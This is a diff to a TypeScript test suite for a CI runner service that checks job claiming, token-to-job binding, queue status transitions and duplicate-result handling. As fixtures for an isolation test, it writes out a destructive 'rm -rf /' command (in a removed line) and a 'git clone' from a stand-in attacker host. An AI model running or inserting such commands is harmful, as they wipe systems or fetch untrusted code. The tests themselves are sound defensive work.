@@ -9,11 +9,13 @@ import { createCloudflareContainersLiteCostModel } from "../../src/usage/cost-mo
 import { freshProductDb, makeD1 } from "../helpers/product-db.js";
 import type { DatabaseSync } from "node:sqlite";
 
-function seedFixture(db: DatabaseSync) {
+const DEFAULT_JOB_STEPS = JSON.stringify([{ executable: "node", args: ["-e", "console.log('diffci-runner-ok')"] }]);
+
+function seedFixture(db: DatabaseSync, jobReference: string = DEFAULT_JOB_STEPS) {
   db.exec(`INSERT INTO organizations (id, name, slug, created_at, updated_at) VALUES ('org-1', 'Acme', 'acme', '2026-01-01T00:00:00Z', '2026-01-01T00:00:00Z')`);
   db.exec(`INSERT INTO organizations (id, name, slug, created_at, updated_at) VALUES ('org-2', 'Other', 'other', '2026-01-01T00:00:00Z', '2026-01-01T00:00:00Z')`);
   db.exec(`INSERT INTO runners (id, organization_id, provider, status, requested_resource_class, created_at) VALUES ('runner-1', 'org-1', 'cloudflare-containers-async', 'assigned', 'lite', '2026-01-01T00:00:00Z')`);
-  db.exec(`INSERT INTO execution_queue_items (id, organization_id, job_reference, requested_resource_class, priority, status, attempts, max_attempts, created_at, updated_at) VALUES ('job-1', 'org-1', 'node -e "console.log(''diffci-runner-ok'')"', 'lite', 100, 'assigned', 1, 3, '2026-01-01T00:00:00Z', '2026-01-01T00:00:00Z')`);
+  db.prepare(`INSERT INTO execution_queue_items (id, organization_id, job_reference, requested_resource_class, priority, status, attempts, max_attempts, created_at, updated_at) VALUES ('job-1', 'org-1', ?, 'lite', 100, 'assigned', 1, 3, '2026-01-01T00:00:00Z', '2026-01-01T00:00:00Z')`).run(jobReference);
 }
 
 interface AuditEvent {
@@ -98,11 +100,22 @@ describe("handleClaim", () => {
     const result = await handleClaim(raw, deps);
     assert.equal(result.ok, true);
     assert.equal(result.data?.jobId, "job-1");
-    assert.match(result.data!.command, /diffci-runner-ok/);
+    assert.equal(result.data!.steps.length, 1);
+    assert.match(result.data!.steps[0]!.args.join(" "), /diffci-runner-ok/);
 
     const runner = await deps.runnerStore.getRunner("runner-1");
     assert.equal(runner?.status, "busy");
     assert.ok(auditEvents.some((e) => e.action === "runner.execution_started"));
+  });
+
+  it("R2 Part 23: the queue item transitions to 'running' when the job is claimed - closes the R1 gap", async () => {
+    const db = freshProductDb(["runner", "execution-queue", "usage"]);
+    seedFixture(db);
+    const { deps } = makeDeps(db);
+    const { raw } = await deps.tokenStore.issueToken({ runnerId: "runner-1", jobId: "job-1", organizationId: "org-1", ttlMs: 60_000 });
+    await handleClaim(raw, deps);
+    const item = await deps.queueStore.getItem("job-1");
+    assert.equal(item?.status, "running");
   });
 
   it("rejects a second claim attempt with the same token - token replay (Part 28)", async () => {
@@ -121,13 +134,14 @@ describe("handleClaim", () => {
   it("a token minted for one job cannot claim a different job - only its own bound job is ever returned", async () => {
     const db = freshProductDb(["runner", "execution-queue", "usage"]);
     seedFixture(db);
-    db.exec(`INSERT INTO execution_queue_items (id, organization_id, job_reference, requested_resource_class, priority, status, attempts, max_attempts, created_at, updated_at) VALUES ('job-2', 'org-1', 'rm -rf /', 'lite', 100, 'assigned', 1, 3, '2026-01-01T00:00:00Z', '2026-01-01T00:00:00Z')`);
+    const job2Steps = JSON.stringify([{ executable: "git", args: ["clone", "https://attacker.example/evil.git"] }]);
+    db.prepare(`INSERT INTO execution_queue_items (id, organization_id, job_reference, requested_resource_class, priority, status, attempts, max_attempts, created_at, updated_at) VALUES ('job-2', 'org-1', ?, 'lite', 100, 'assigned', 1, 3, '2026-01-01T00:00:00Z', '2026-01-01T00:00:00Z')`).run(job2Steps);
     const { deps } = makeDeps(db);
     const { raw } = await deps.tokenStore.issueToken({ runnerId: "runner-1", jobId: "job-1", organizationId: "org-1", ttlMs: 60_000 });
 
     const result = await handleClaim(raw, deps);
     assert.equal(result.data?.jobId, "job-1");
-    assert.notEqual(result.data?.command, "rm -rf /", "a token scoped to job-1 must never surface job-2's command");
+    assert.notDeepEqual(result.data?.steps, JSON.parse(job2Steps), "a token scoped to job-1 must never surface job-2's steps");
   });
 
   it("cross-organization isolation: a token minted for org-1 always resolves to org-1, never org-2, regardless of request content", async () => {
@@ -184,6 +198,40 @@ describe("handleResult", () => {
     const events = await deps.usageStore.listEventsInRange("org-1", "2020-01-01T00:00:00Z", "2030-01-01T00:00:00Z");
     assert.equal(events.filter((e) => e.eventType === "runner_seconds").length, 1, "must still be exactly one - never double-billed");
     assert.equal(events.filter((e) => e.eventType === "runner_job").length, 1);
+  });
+
+  it("R2 Part 23: a successful result moves the queue item to 'completed'", async () => {
+    const { deps, raw } = await claimedFixture();
+    await handleResult({ token: raw, exitCode: 0, stdout: "ok\n", durationMs: 100 }, deps);
+    const item = await deps.queueStore.getItem("job-1");
+    assert.equal(item?.status, "completed");
+  });
+
+  it("R2 Part 23: a non-zero exit moves the queue item to 'failed', distinctly from 'completed'", async () => {
+    const { deps, raw } = await claimedFixture();
+    await handleResult({ token: raw, exitCode: 1, stdout: "", stderr: "boom", durationMs: 100 }, deps);
+    const item = await deps.queueStore.getItem("job-1");
+    assert.equal(item?.status, "failed");
+  });
+
+  it("R2 Part 23: a timed-out result moves the queue item to 'timed_out', distinctly from 'failed'", async () => {
+    const { deps, raw } = await claimedFixture();
+    await handleResult({ token: raw, exitCode: 1, stdout: "", stderr: "", durationMs: 30_000, timedOut: true }, deps);
+    const item = await deps.queueStore.getItem("job-1");
+    assert.equal(item?.status, "timed_out");
+  });
+
+  it("R2 Part 24: a duplicate result never moves the queue item's terminal state again (no backward/repeat transition)", async () => {
+    const { deps, raw } = await claimedFixture();
+    await handleResult({ token: raw, exitCode: 0, stdout: "ok\n", durationMs: 100 }, deps);
+    const afterFirst = await deps.queueStore.getItem("job-1");
+    assert.equal(afterFirst?.status, "completed");
+
+    // A second, duplicate result claims a DIFFERENT outcome (failure) - if idempotency were broken,
+    // this would move a terminal 'completed' item to 'failed'. It must not.
+    await handleResult({ token: raw, exitCode: 1, stdout: "", stderr: "boom", durationMs: 100 }, deps);
+    const afterSecond = await deps.queueStore.getItem("job-1");
+    assert.equal(afterSecond?.status, "completed", "a duplicate/replayed result must never move an already-terminal queue item");
   });
 
   it("truncates stdout/stderr to the output cap (Part 17) rather than storing unbounded logs", async () => {
